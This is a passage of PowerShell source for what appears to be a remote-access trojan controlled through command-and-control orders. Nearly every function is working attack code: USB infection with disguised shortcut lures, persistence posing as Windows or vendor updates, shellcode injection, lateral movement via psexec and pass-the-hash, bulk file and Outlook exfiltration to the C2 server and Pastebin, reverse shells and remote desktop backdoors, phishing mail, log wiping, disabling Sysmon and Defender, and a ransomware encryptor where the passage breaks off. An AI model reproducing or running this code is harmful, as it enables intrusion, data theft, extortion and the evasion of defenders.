			$usbspreading = $LatestOrder.split('|')[1]
			$usbencoded = $myAgntencoded
			$result = ls $USBDrive
			sendC2 $pc $result $id
			} 
			function usbinfect {
				[CmdletBinding()] param( 
				[string]$encoded
				)
			# Detect USB letter
				$USBDrive = Get-WmiObject Win32_Volume -Filter "DriveType='2'"|select -expand driveletter
				if ($USBDrive) {
				# Create folder
				 md $USBDrive\container
				# copy all files in folder
				 move $USBDrive\* $USBDrive\container
				# Create lnk
				 $WshShell = New-Object -comObject WScript.Shell
				 $Shortcut = $WshShell.CreateShortcut("$USBDrive\SecuredContent.lnk")
				 $Shortcut.TargetPath = "cmd /c PowerShell -Exec Bypass -NoL -Win Hidden -Enc $encoded;start $USBDrive\container"
				 $Shortcut.Save()
				 #move $USBDrive\* $USBDrive\container
				# Hide folder
				attrib +h $USBDrive\container
				}
			}
		Function PersistCommand { # !persist     !persist|reg / startup / task / wmi / sc / all |calc
			[CmdletBinding()] param( 
			[string]$id
			)
			$method_persist = $LatestOrder.split('|')[1]
			$myOwnPayload = $LatestOrder.split('|')[2]
			[string] $encoded = $myAgntencoded
            if (!$myOwnPayload) {
				$payload = $myOwnPayload
				}
			else {
				$payload = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exe bypass -nol -win hidden -enc myAgntencoded"
				}		
			[string]$result = "PERSITENCE ---"
			function persistTask {
				$pa = @"
powershell.exe -Win hidden -NoL -Non -ep bypass -nop -c IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/pnt.ps1"))
"@
				$r1 = schtasks /create /tn OfficeUpdates-Service /tr "$pa" /sc onidle /i 30
				$r2 = schtasks /create /tn GoogleUpdates-us /tr "$pa" /sc onlogon /ru System
				$r3 = schtasks /create /tn SkypeUpdates-en /tr "$pa" /sc onstart /ru System
				$result += "$r1 - $r2 - $r3"
				}
			function persistService {
				[string] $PersistencePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\wuausvc.lnk"
				$WScript = New-Object -ComObject Wscript.Shell
				$Shortcut = $Wscript.CreateShortcut($PersistencePath)
				$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
                $Shortcut.Arguments =  "-Exec Bypass -NoL -Win Hidden -Enc $myAgntencoded"
				$Shortcut.IconLocation = "explorer.exe,23"
				$Shortcut.Description = "Windows Criticals Updates shortcut"
				$Shortcut.WindowStyle = 7
				$Shortcut.Save()
				$result += dir $PersistencePath
				$result += New-Service -Name 'wuausvc' -displayName 'Windows Update Service' -BinaryPathName $PersistencePath -Description 'Enables Remediation and protection of Windows Update components (WUC)' -StartupType Automatic
				}
			function persistReg {
				$Pathreg =  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Exec Bypass -NoL -Win Hidden -Enc $myAgntencoded"
				$registryPath1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
				$registryPath2 = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
				$name = "Release"
				New-ItemProperty -Path $registryPath1 -Name $name -Value $Pathreg -PropertyType String -Force | Out-Null
				New-ItemProperty -Path $registryPath2 -Name $name -Value $Pathreg -PropertyType String -Force | Out-Null
				$result +="reg ready"
				}
			function persistWmi {
				if ($IsAdmin -eq $True) {
				$cmd_persist = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -nol -win hidden -enc $myAgntencoded" 
				IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/wmipersist.txt"));
				wmiPersistence $cmd_persist
				} else {$result += "not admin"}
				}
			function persistStartup {
				if ($IsAdmin -eq $True) {
				[string] $PersistencePath = "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\StartUp\explorer.bat"
				} else {
				[string] $PersistencePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\explorer.bat"
				}
				echo "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $encoded" > $PersistencePath	
				$result += dir $PersistencePath
				}
			if ($method_persist -eq "task") {	
				persistTask
				}
			if ($method_persist -eq "reg") {
				persistReg
				}
			if ($method_persist -eq "wmi") {
				persistWmi
				}
			if ($method_persist -eq "startup") {
				persistStartup
				}
			if ($method_persist -eq "sc") {
				persistService
				} 				
			if ($method_persist -eq "all") {
				persistStartup
				persistReg
				persistTask
				persistWmi
				persistService
				} 
			sendC2 $pc $result $id
		} 		
		Function MigrateCommand{ # !migrate|4223
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $pid = $LatestOrder.split('|')[1]
			$result = ps
			$result += "--"
			# inject code to process $pid.  If no $pid, find "explorer" and inject into it.
			IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/migrate.txt"))
			if (!$pid) {
				$pid = Get-Process explorer | select -ExpandProperty Id
				$result += Invoke-Shellcode -ProcessId $pid 
				}
				else {$result += Invoke-Shellcode -ProcessId $pid 
				}
			sendC2 $pc $result $id
			}
		Function InfectmacroCommand { # !infectmacro|C:\Users|macro.txt
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $Folder = $LatestOrder.split('|')[1]
			[string] $MacroFile = $LatestOrder.split('|')[2]
			# download macro file
			(New-Object System.Net.WebClient).DownloadFile("$c2c/ROOT_FOLDER/link/$MacroFile","$env:userprofile\AppData\mcr.txt")
			#inject macro file
			IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/injctmacro.txt"))
			[string]$result = Inject-Macro -Doc $Folder -Macro "$env:userprofile\AppData\mcr.txt" -Infect 
			sendC2 $pc $result $id
			}
	# Pivoting & Covert Channel  > BEGIN
		Function PivotCommand { # !pivot|ngrok / socks / portfwd  
		    [CmdletBinding()] param( 
			[string]$id
			)
			$result = "OK"
			sendC2 $pc $result $id
			} 
		Function NgrokTunnelCommand {  # !ngrok|authkey|http|80 -- deploy ngrok so you can remote connect to the zombie
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $authkey = $LatestOrder.split('|')[1]
			[string] $protocol = $LatestOrder.split('|')[2]
			[string] $port = $LatestOrder.split('|')[3]
			$p = Test-Path -Path $env:userprofile\Appdata\tun.exe
			if ($p -eq $False){ 
			downloadFile "$c2c/ROOT_FOLDER/link/tunnel.txt" "$env:userprofile\Appdata\tun.exe"
			}
			$c = @"
$env:userprofile\Appdata\tun.exe authtoken $authkey 
$env:userprofile\Appdata\tun.exe $protocol $port --log=stdout > $env:userprofile\Appdata\e.log
"@
			RunJob -code $c
			[string]$result = "Read the tunnel ID in ngrok Account and use it to connect PC"
			sendC2 $pc $result $id
		}
		Function SocksProxyCommand {  # !socks|1234 -- Create a Socks 4/5 proxy on port 1234, configure your browser to use socks and browse in the context of this pc
		[CmdletBinding()] param( 
		[string]$id
		)
		[string] $bindport = $LatestOrder.split('|')[1]
		(New-Object System.Net.WebClient).DownloadFile("$c2c/ROOT_FOLDER/link/invksocks.psm1","$env:userprofile\invksocks.psm1")
		$c = @"
Import-Module "$env:userprofile\invksocks.psm1"
Invoke-SocksProxy -bindPort $bindport
"@
		RunJob -code $c
		$result = "Socks ready - Bind on $bindport"			
		sendC2 $pc $result $id
		}
		Function PortFwdCommand { 	 # !portfwd|33389|127.0.0.1|3389 -- Create a simple tcp port forward
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $bindport = $LatestOrder.split('|')[1]
			[string] $desthost = $LatestOrder.split('|')[2]
			[string] $destport = $LatestOrder.split('|')[3]
			(New-Object System.Net.WebClient).DownloadFile("$c2c/ROOT_FOLDER/link/invksocks.psm1","$env:userprofile\invksocks.psm1")
			$c = @"
Import-Module $env:userprofile\invksocks.psm1;
Import-Module .\Invoke-SocksProxy.psm1;
Invoke-PortFwd -bindPort $bindport -destHost $desthost -destPort $destport ;
"@
			RunJob -code $c
			$result = "Port forwarding ready - bind on $bindport forward to $desthost - $destport"			
			sendC2 $pc $result $id
			}
		Function C2ChannelCommand { # !c2channel|gmail|http:\\server\config.ini
		# switch covert canal to : dns, icmp, gmail, twitter or dropbox (a BIG TASK )
		}
		Function SetProxyCommand { # !proxy|213.18.200.13|8484 - Set proxy configuration. you can use fiddler here to see HTTPS. or setup your own proxy 
		    [CmdletBinding()] param( 
			[string]$id
			)
			[string] $serverip = $LatestTweet.split('|')[1]
			[string] $serverport = $LatestTweet.split('|')[2]
			iex((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/setproxy.txt"))
			set-proxy -server $serverip -port $serverport
			Start-Sleep -Seconds 5
			[string] $result = get-proxy
			sendC2 $pc $result $id
			} 
	#  Lateral movement
		Function WormCommand { 	 # !worm|login|password
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $logindom = $LatestOrder.split('|')[1]
			[string] $pass = $LatestOrder.split('|')[2]
			[string] $FileOnDisk =  "$env:userprofile\log.txt"
			$payload = @"
IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/pnt.ps1")
"@
			(New-Object System.Net.WebClient).DownloadFile("$c2c/ROOT_FOLDER/link/psx.txt",$FileOnDisk)
			#Convert txt to exe     
			[string]$hex = get-content -path $FileOnDisk
			[Byte[]] $temp = $hex -split ' '
			[System.IO.File]::WriteAllBytes("$env:userprofile\help.exe", $temp)
			attrib +h "$env:userprofile\help.exe"
			$result = "ok"
			$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
			$w = $ip.split('.')[0]
			$x = $ip.split('.')[1]
			$y = $ip.split('.')[2]
			$z = $ip.split('.')[3]
			$StartAddress = "$w.$x.$y"
			for($i = 1; $i -lt 254; $i++) {
				$ipAddress= "$StartAddress.$i"
				$hostName = [System.Net.Dns]::GetHostByAddress($ipAddress).Hostname
				if($hostName) {
				$Command = "$env:userprofile\help.exe \\$ipAddress -u $logindom -p $pass -h -d powershell.exe -exec bypass -w hidden '$payload'"
				executer -runLocal $Command
			#$Creds = New-object System.Management.Automation.PSCredential $logindom,$passencrypted
			#Invoke-Command -ComputerName $host_target -ScriptBlock { $payload } -credential $Creds
				}
			}
			Remove-Item "$env:userprofile\help.exe"
			sendC2 $pc $result $id
		}
		Function PsexecCommand { # !psexec|domain\admin|password|192.168.3.202|powershell -exec bypass calc
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $login = $LatestOrder.split('|')[1]
			[string] $pass = $LatestOrder.split('|')[2]
			[string] $ipAddress = $LatestOrder.split('|')[3]
			[string] $cmdline = $LatestOrder.split('|')[4]
			$logindom = "$dom\$login"
			$exists = "$env:userprofile\help.exe"
			If (Test-Path $exists){
				del "$env:userprofile\log.txt"
				del "$env:userprofile\help.exe"
			}
			$downloadURL = "$c2c/ROOT_FOLDER/link/psx.txt"
            [string] $FileOnDisk =  "$env:userprofile\log.txt"
			
            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
			$WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
			#Convert txt to exe
			[string]$hex = get-content -path $FileOnDisk
			[Byte[]] $temp = $hex -split ' '
			[System.IO.File]::WriteAllBytes("$env:userprofile\help.exe", $temp)
			#attrib +h "$env:userprofile\help.exe"
			#attrib +h "$env:userprofile\log.txt"
			$result = ls | findstr help 
			sendC2 $pc $result $id
			Auth_psexec $ipAddress $hostName
							
			function Auth_psexec {
				[CmdletBinding()] param( 
					[string] $ip_target
					)
				$payload = @"
IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/pnt.txt")
"@
				write-host "Successfully authenticated with domain "
				$Command = "$env:userprofile\help.exe \\$ip_target -u $logindom -p $pass -h -d $cmdline"
				[string] $CmdPath = "$env:windir\System32\cmd.exe"
				[string] $CmdString = "$CmdPath" + " /C " + "$Command"
				Invoke-Expression $CmdString
				del "$env:userprofile\help.exe"
			}
			sendC2 $pc $result $id
		}
		Function WmiLatmoveCommand { # !pthwmi|192.168.3.202|toto|F6F38B793DB6A94BA04A5|powershell.exe 'calc.exe'
			[string] $TargetIp = $LatestOrder.split('|')[1]
			[string] $username = $LatestOrder.split('|')[2]
			[string] $hash = $LatestOrder.split('|')[3]
			[string] $command = $LatestOrder.split('|')[4]
			IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/pthwmi.txt"));
			[string]$result = Invoke-WMIExec -Target $TargetIp -Domain $DomainOrWorkgroup -Username $username -Hash $hash	
			$cmde = @"
IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/pthwmi.txt"));
Invoke-WMIExec -Target $TargetIp -Domain $DomainOrWorkgroup -Username $username -Hash $hash -Command $command
"@
			RunJob -code $cmde
			sendC2 $pc $result $id
		
		}	
		Function pthCommand { # !pthsmb|192.168.3.202|toto|F6F38B793DB6A94BA04A5|powershell.exe 'calc.exe'
			[string] $TargetIp = $LatestOrder.split('|')[1]
			[string] $username = $LatestOrder.split('|')[2]
			[string] $hash = $LatestOrder.split('|')[3]
			[string] $command = $LatestOrder.split('|')[4]
			IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/pthsmb.txt"));
			[string]$result = Invoke-SMBExec -Target $TargetIp -Domain $DomainOrWorkgroup -Username $username -Hash $hash			
			$cmde = @"
IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/pthwmi.txt"));
Invoke-SMBExec -Target $TargetIp -Domain $DomainOrWorkgroup -Username $username -Hash $hash -Command $command
"@
			RunJob -code $cmde
			sendC2 $pc $result $id
		}
	#  Exfitration & Compression > BEGIN
		Function ZipCommand { # !zip|C:\users\public\documents\|C:\users\secret.zip
			[CmdletBinding()] param( 
			[string]$id
			)
			$source = $LatestOrder.split('|')[1]
            $destination =  $LatestOrder.split('|')[2]
			zip $source $destination
			$result = 'ok - dont forget to exfiltrate'
			sendC2 $pc $result $id
		}		
		Function ExfiltrateCommand { # !exfiltrate|C:\users    # Find files by extensions with a recursive search and compress the result. 
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $startfolder = $LatestOrder.split('|')[1]
			[string]$result = "Start exfiltration"
			$extensionArray = "xlsx","xls","docx","doc","jpg","jpeg","png","pdf","txt","pptx","ppt","pst"
			foreach ($extension in $extensionArray) {
				Get-ChildItem -Path $startfolder -Recurse -ErrorAction SilentlyContinue -Filter *.$extension |  Where-Object { $_.Extension -eq ".$extension" }|foreach {$path = Resolve-Path $_.FullName ; Exfiltrate $path; $path}  
				}
			sendC2 $pc $result $id		
			}
		Function ExfilFilesCommand { # just exfiltrate file provided 
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $Path = $LatestOrder.split('|')[1]
			[System.Net.ServicePointManager]::ServerCertificateValidationCallback={true};
			$http=new-object System.Net.WebClient;
			[string] $url="$c2c/ROOT_FOLDER/exfil.php?pc=$pc";
			$exfil=$http.UploadFile($url,$Path);
			$result = $Path
			sendC2 $pc $result $id
			}		
        Function ExfiltratePastebin {
			Param([String]$Text)
			$postParams = @{api_dev_key='5052e0cedb40e0335e3f707bf8fce9c7';api_option='paste';api_paste_code=$Text;api_paste_name='title-of-paste';api_paste_private='2';api_user_key='0eb2184947e88844a119c70253693b92'}
			Invoke-WebRequest -Uri http://pastebin.com/api/api_post.php -Method POST -Body $postParams
			}
		Function FiletoBase64 {
			Param([String]$path)
			$FileBytes = [System.IO.File]::ReadAllBytes($path)
            $EncodedFile = [System.Convert]::ToBase64String($FileBytes)
			#$base64 = [convert]::ToBase64String((get-content $path -encoding byte))
			#$postParams = @{api_dev_key='5052e0cedb40e0335e3f707bf8fce9c7';api_option='paste';api_paste_code='$base64';api_paste_name='title-of-paste';api_paste_private='2';api_user_key='0eb2184947e88844a119c70253693b92'}
			#Invoke-WebRequest -Uri http://pastebin.com/api/api_post.php -Method POST -Body $postParams
		}
		Function SendmailCommand { # !sendmail|.\Targets.txt|subject|Hello Im your friend|c:\evil.pdf|http:/download.me|template.html
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $mailto = $LatestOrder.split('|')[1] # if empty, it select randomly 100 contacts from outlook 
			[string] $subject = $LatestOrder.split('|')[2]
			[string] $body = $LatestOrder.split('|')[3]
			[string] $file = $LatestOrder.split('|')[4]
			[string] $url = $LatestOrder.split('|')[5]
			[string] $template = $LatestOrder.split('|')[6]
			IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/sendmail.txt"))
			[string] $rs = "" 
			$rs += Invoke-SendMail -TargetList "$mailto" -URL "$url" -Subject "$subject" -Body "$body <a href='$url'>ACCESS!</a>" -Attachment $file -Template $template
			$rs += "-- "
			$result = $rs		
			sendC2 $pc $result $id
			}
		Function Get-Outlook { # exfiltrate outlook pst
			[CmdletBinding()] param( 
			[string]$id
			)
			[string]$result = ""
			ls c:\*.pst -Recurse|foreach { $path = Resolve-Path $_.FullName; $c = $_.CreationTime ; $t = dir $path; $result = "$result `n  $path `n  $t `n  $c "}
			ls d:\*.pst -Recurse|foreach { $path = Resolve-Path $_.FullName; $c = $_.CreationTime ; $t = dir $path; $result = "$result `n  $path `n  $t `n  $c "}
			$result = "$result USE EXFILTRATION COMMAND TO EXFILTRATE OUTLOOK PST ARCHIVES OF YOUR CHOICE !"
			sendC2 $pc $result $id
			}
		Function ExfilOneDrivCommand { # !exfilonedriv|file.txt
			[CmdletBinding()] param( 
			[string]$id
			)
			$result = "OK"
			sendC2 $pc $result $id
			}	
	# Shell & Remote Access > BEGIN
		Function InjectShellcode { # !shellcode|@(0x90,0x90,0xC3)
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $shellcod = $LatestOrder.split('|')[1]
			$result = ps
			$result += "`n`n"
			# inject shellcode to current process.
			IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/migrate.txt"))
			$result += Invoke-Shellcode -Shellcode $shellcod 
			sendC2 $pc $result $id
			}
        Function WebShellCommand {  # !wshell|8080  -  start a local web server backdoor. use !ngrok to expose port and connect
            [CmdletBinding()] param( 
			[string]$id
			)
			[int32] $TcpListenerPort = $LatestOrder.split('|')[1]
			$command = @"
IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/bindwshell.txt"));
StartWshell -BINDING "http://localhost:$TcpListenerPort/"
"@ 
			RunJob -code $command       
			$result ="webshell OK. You need to use !ngrok to expose port $TcpListenerPort --- ngrok http $TcpListenerPort"
			sendC2 $pc $result $id
        }
		Function DropboxC2Command {  # !dropboxc2  -  start dropbox client backdoor (configure and start python C2 first) 
            [CmdletBinding()] param( 
			[string]$id
			)
			[int32] $TcpListenerPort = $LatestOrder.split('|')[1]
			$command = @"
IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/dropboxc2.txt"));
Invoke-DBC2
"@ 
			RunJob -code $command       
			$result ="Use Invoke-DBC2 - start dropbox client backdoor (configure server side)"
			sendC2 $pc $result $id
        } 
		Function ReverseShellCommand {  # !reverseshell|AttackerIP|4545
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $ReverseAttackerIP = $LatestOrder.split('|')[1]
			[int32] $TcpListenerPort = $LatestOrder.split('|')[2]
			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/reversecon.txt"));
			ReverseConnect $ReverseAttackerIP $TcpListenerPort
			executer -runLocal $command       
			$result ='ok'
			sendC2 $pc $result $id
        }
		Function JsRatShell{     # !jsrat|212.74.21.23  OR  !jsrat|xxxxxx.ngrok.io   (without HTTP/s)
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $serverIPorUrl = $LatestOrder.split('|')[1]
			$cmde = "rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new%20ActiveXObject(""WinHttp.WinHttpRequest.5.1"");w=new%20ActiveXObject(""WScript.Shell"");try{v=w.RegRead(""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer"");q=v.split(""="")[1].split("";"")[0];h.SetProxy(2,q);}catch(e){}h.Open(""GET"",""http://$serverIPorUrl/connect"",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c taskkill /f /im rundll32.exe"",0,true);}"
			executer -runLocal $cmde	
			$result = "Server side: powershell.exe -ExecutionPolicy Bypass -File c:\AttackerPC\JSRatServer.ps1 , Modify the file and put the right IP address.  https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.txt"
			sendC2 $pc $result $id
			}
		Function VncCommand{     # !vnc|bind||5900|pass1234   OR  §vnc|reverse|publicIP_of_attacker|5500|pass1234 --Tips: use bind with tunnel command, tunnel use ngrok to expose host in public network
			[CmdletBinding()] param( 
			[string]$id
			) #USE REVERSE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
			[string] $ConnectionType = $LatestOrder.split('|')[1]
			[string] $VncIPreverse = $LatestOrder.split('|')[2]
			[string] $VncPort = $LatestOrder.split('|')[3]
			[string] $VncPass = $LatestOrder.split('|')[4]
			iex (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/vnc.txt")
			if ($ConnectionType = "reverse" ) {
			Invoke-Vnc -ConType reverse -IpAddress $VncIPreverse -Port $VncPort -Password $VncPass
			} else { if ($ConnectionType = "bind" ) {
			$VncIPreverse=0
			Invoke-Vnc -ConType bind -Port $VncPort -Password $VncPass
			}}
			$result = "VNC ready - Reverse IP:$VncIPreverse Port:$VncPort Pass:$VncPass"
			sendC2 $pc $result $id
			}
		Function RDPCommand { 	 # !rdp -- Activate RDP and expose 3389 port with ngrok over Internet
			[CmdletBinding()] param( 
			[string]$id
			)
			if ($IsAdmin -eq $True) {
				reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
				Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
				$result = net start TermService
				sc config TermService start= auto
				$result += "RDP activation OK. Service set to AUTO. no need to run this command again after a reboot. Use !ngrok to expose port 3389"
				sendC2 $pc $result $id
			} else {
				$result = "RDP activation FAIL! Need Admin Session /!\"
				sendC2 $pc $result $id
			}
		}
		Function BeefCommand {   # !beef|iexplore.exe|http://192.168.3.40:3000/demos/basic.html
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $browser = $LatestOrder.split('|')[1]
			[string] $webpage = $LatestOrder.split('|')[2]
			if ($browser -eq "iexplore.exe") {
				$IE=new-object -com internetexplorer.application
				$IE.navigate2("$webpage")
				$IE.visible=$false
			}else {
				Start-Process -WindowStyle Hidden "$browser" "$webpage"
			}
			$result = "OK! Check your Beef UI Panel"
			sendC2 $pc $result $id
            }  
		Function HttpRatShell {  # !httprat|212.74.21.23  OR  !httprat|xxxxxx.ngrok.io   (without HTTP/s)
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $serverIPorUrl = $LatestOrder.split('|')[1]			
			$cmde = @"
iex((New-Object Net.WebClient).DownloadString("http://$serverIPorUrl/connect"))
"@
			RunJob -code $cmde	
			$result = "Server side: powershell.exe -Exec Bypass -File c:\AttackerPC\HttpRatServer.ps1 - You edit it before (Better use ngrok URL)"
			sendC2 $pc $result $id
			}  
		Function NetCatShell {  # !nc|212.74.21.23  OR  !nc|xxxxxx.ngrok.io   - RUN BEFORE Server side: nc —v —l —p (port)  
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $serverIP = $LatestOrder.split('|')[1]	
			[string] $serverPort = $LatestOrder.split('|')[2]				
			$cmde = @"
iex((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/ncat.txt"))
ncat $serverIP $serverPort
"@
			RunJob -code $cmde	
			$result = "Server side: nc —v —l —p (port)  (Better use ngrok URL)"
			sendC2 $pc $result $id
			} 	
    # Defense-bypasss > BEGIN
		Function ClearEventLog { # !clearevent  -- 
			[CmdletBinding()] param( 
			[string]$id
			)
			if ($IsAdmin -eq $True) { $result = wevtutil el | Foreach-Object {wevtutil cl $_} }
			else { $result="No admin privs"}
			sendC2 $pc $result $id
			}
		Function SysmonKillCommand { # Check if sysmon is installed and kill it
			[CmdletBinding()] param( 
			[string]$id
			)
			if ($IsAdmin -eq $True) {
				$IsSysmon = fltmc | findstr SysmonDrv
				if ($IsSysmon) {fltmc unload SysmonDrv
					$AfterSysmonKill = fltmc
					}
				$result= "Before: $IsSysmon - After: $AfterSysmonKill"
				}
			else {$result = "No Admin Right"}
			sendC2 $pc $result $id
			}
		Function LogBypassCommand { # !logbypass    -   Ivoke-phant0m
			[CmdletBinding()] param( 
			[string]$id
			)
			if ($IsAdmin -eq $True) {
			$command = @"
IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/InvkPhantom.txt");Invoke-Phant0m
"@ 
			executer -runLocal $command
			$r2 = "OK, invisible mode activated against eventviewer"
			$result = "$r2"			
			} else {
			$result = "Not admin ! Run it with Tater (hotpotatoes attack): !hotpotatoes|$command `n`n !LogBypassCommand"
				}
			sendC2 $pc $result $id
			}
		Function ExtractLogCommand { #!extractlog|system
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $logFileName = $LatestOrder.split('|')[1]
			# Config
			#$logFileName # Add Name of the Logfile (System, Application, etc)
			#$path = ".\" # Add Path, needs to end with a backsplash
			$dd = get-date -f yyyyMMdd
			[string] $exportFileName = "$env:userprofile\appdata\$logFileName-$dd.evt"
			if ($IsAdmin -eq $True) {
			$logFile = Get-WmiObject Win32_NTEventlogFile | Where-Object {$_.logfilename -eq $logFileName}
			$logFile.backupeventlog($exportFileName)
			$r2 = "$c2c/ROOT_FOLDER/exfil/$pc/$exportFileName"
			$result = "$r2"			
			Exfiltrate $exportFileName
			Remove-Item $exportFileName
			} else {
			$result = "Not Admin"
			}
			sendC2 $pc $result $id
			
			}
		Function MacAttribCommand { #!macattrib|C:\secret.txt|01/03/2006 12:12 pm
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $file = $LatestOrder.split('|')[1]
            [string] $accessdate =  $LatestOrder.split('|')[2]
			$r1 = ls $file
			$command = @"
IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/setMacAttrib.txt");Set-MacAttribute -FilePath $file -All $accessdate
"@ 
			executer -runLocal $command
			$r2 = ls $file
			$result ='BEFORE: $r1  `n  AFTER: $r2'
			sendC2 $pc $result $id
		}    
		Function FirewallCommand { #!firewall|on / off
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $State = $LatestOrder.split('|')[1]
			if ($state -eq "on") {netsh advfirewall set allprofiles state on}
			
			if ($state -eq "off") {netsh advfirewall set allprofiles state off}
			#netsh advfirewall firewall add rule name="Port $portToOpen" dir=in action=allow protocol=TCP localport=$portToOpen
			#netsh advfirewall firewall add rule name="Port $portToOpen" dir=out action=allow protocol=TCP localport=$portToOpen 
			$dd = get-date -f yyyyMMdd
			netsh advfirewall firewall show rule name=all > "$env:userprofile\appdata\firewall-$dd.txt"
			$result = "firewall-$dd.txt"
			Exfiltrate "$env:userprofile\appdata\firewall-$dd.txt"
			sendC2 $pc $result $id
			Remove-Item "$env:userprofile\appdata\firewall-$dd.txt"
			}
		Function winDefKillCommand { #  !windefkill   OR !windefkill|10.10.10.2   -  Kill Windows Defender locally or remotely
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $name = $LatestOrder.split('|')[1]
			if ($IsAdmin -eq $True) {
			Invoke-WmiMethod -ComputerName $name -Class Win32_Process -Name Create -ArgumentList "powershell.exe exec bypass -c 'Set-MpPreference -DisableRealtimeMonitoring $true'"
			$result = "Windefender killing attempted"
			} else {
			$result = "Need to elevate as admin" }
			sendC2 $pc $result $id
			}
	# Encryption & Ransomware  > BEGIN
		Function EncryptCommand { # !encrypt|Q4dsd87rn1AE5@54fDER4584S2dZFjjk|C:\users\
			[CmdletBinding()] param( 
			[string]$id
			)
			$exists = "$env:userprofile\aex.exe"
			If (Test-Path $exists){
				del "$env:userprofile\rec.txt"
				del "$env:userprofile\aex.exe"
				del "$env:userprofile\dl.txt"
				del "$sdel"
			}
			#Cryptor
			[string] $cypher = $LatestOrder.split('|')[1]
			[string] $startfolder = $LatestOrder.split('|')[2]
			$downloadURL = "$c2c/ROOT_FOLDER/link/aes.txt"
            [string] $FileOnDisk =  "$env:userprofile\rec.txt"
            downloadFile $downloadURL $FileOnDisk
			Invoke-Expression $downloadedScript
			[string]$hex = get-content -path $FileOnDisk
			[Byte[]] $temp = $hex -split ' '
			[System.IO.File]::WriteAllBytes("$env:userprofile\aex.exe", $temp)
			#attrib +h "$env:userprofile\aex.exe"
			#Deletor
			$downloadURL = "$c2c/ROOT_FOLDER/link/del.txt"
            [string] $FileOnDisk =  "$env:userprofile\dl.txt"
            downloadFile $downloadURL $FileOnDisk
			[string]$hex = get-content -path $FileOnDisk
			[Byte[]] $temp = $hex -split ' '
			$sdel = (gi env:\userprofile).value
			$sdel = "$sdel\dl.exe"
			[System.IO.File]::WriteAllBytes("$sdel", $temp)
			#attrib +h $sdel
			[string[]] $exttocrypt = @()
			$message = "Hello, your files have been encrypted ! This is a ransomware demo. Send me bitcoin NOW !!!"
            $exttocrypt += 'doc','docx','xls','xlsx','ppt','pptx','jpg','png','bmp','pdf','txt','log','mp3','avi','mpeg','mp4'
